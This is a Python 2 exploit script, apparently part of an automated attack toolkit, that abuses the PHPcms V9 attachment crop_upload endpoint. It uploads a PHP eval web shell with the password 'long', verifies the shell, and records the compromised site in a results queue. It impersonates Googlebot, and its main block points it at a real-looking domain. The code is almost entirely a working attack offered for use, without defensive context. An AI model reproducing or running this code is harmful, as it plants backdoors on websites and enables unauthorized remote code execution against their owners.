#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#aspcms注入漏洞及后台文件权限未验证
#PHPcms V9 任意文件读取漏洞
#http://www.wooyun.org/bugs/wooyun-2013-019299
import httplib
import sys
import threading
import re
import urllib2
sys.path.append('..')
import Class_Queue
import yijuhua_CS

class phpcmsv9_getshell(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        self.scan("http://"+self.url)
        #print "%s close--phpcmsv9_getshell!!!!!"%(self.url)

    def scan(self,arg):
        try:
            html = urllib2.urlopen(arg,timeout=10).info()['Server']
            if 'pache' in html:  #判断是否安装了apache
                self.dir(arg)
            else:
                #print '\n亲！此网站不是apache的网站!'
                return 0
        except Exception,e:
            #print e
            return 0

    def dir(self,arg):#创建个文件
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            data = 'i am just test'
            url = arg.split('//')[1]
            site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=shaoxiao.jpg'
            conn = httplib.HTTPConnection(url)
            conn.request('POST',site,data,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            if html:
                self.getshell(arg)
            return 1
        except Exception,e:
            #print e
            return 0

    def getshell(self,arg):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            #data = "test<?php @eval($_POST[\''.'shaoxiao'.'\']);?>'"
            data="<?php @eval($_POST['long']);?>"
            url = arg.split('//')[1]
            site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://'+self.url+'/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php'
            conn = httplib.HTTPConnection(url)
            conn.request('POST',site,data,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            #print html
            if httpres.status == 200 and html:
                gets = re.compile('http://(.*?)\.Php\.JPG\s')
                get = gets.findall(html)
                if get:
                    data='http://'+get[0]+'.Php.JPG%20%20%20%20%20%20%20Php'          #Pass:long
                    if yijuhua_CS.yijuhua_cs("php",data,"long"):   #ASP还是PHP  ,URL地址 ，密码
                    #是
                        EXP_list=[1,self.url,"exp","exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                    else:
                    #否
                        EXP_list=[0,self.url,"exp","exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                    #print "exp_phpcmsv9_getshell---%s---%s"%(data,"webshell--pass:long")
            return 1
        except Exception,e:
            #print e
            return 0



################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(phpcmsv9_getshell("www.sttc.cn"))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程


